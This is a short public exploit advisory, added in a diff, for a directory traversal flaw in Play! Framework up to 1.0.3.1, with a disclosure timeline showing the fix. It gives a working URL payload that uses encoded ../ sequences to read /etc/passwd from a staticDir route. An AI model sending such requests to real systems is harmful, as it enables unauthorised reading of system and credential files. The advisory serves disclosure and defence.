@@ -1,0 +1,23 @@
+Exploit Title:     Play! Framework <= 1.0.3.1 Directory Transversal Vulnerability
+Date:              July 24, 2010
+Author:            kripthor
+Software Link:     http://www.playframework.org/
+Version:           Play! Framework <= 1.0.3.1
+Tested on:         Ubuntu 10 
+CVE :              N/A
+Notes:             28/07/2010 at 14:03 - Developer contacted
+                   28/07/2010 at 15:04 - Fix released
+                   10/08/2010 at 17:00 - Exploit published
+References: 	   www.playframework.com
+
+
+An attacker can download any file that the owner of the Play! process can read.
+
+Simply browse to:
+
+http://127.0.0.1:9000/public/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd
+
+The '/public' directory must be a directory with a 'staticDir' mapping in the 'conf/routes' configuration file. 
+Typically an images or css directory on the server.
+
+
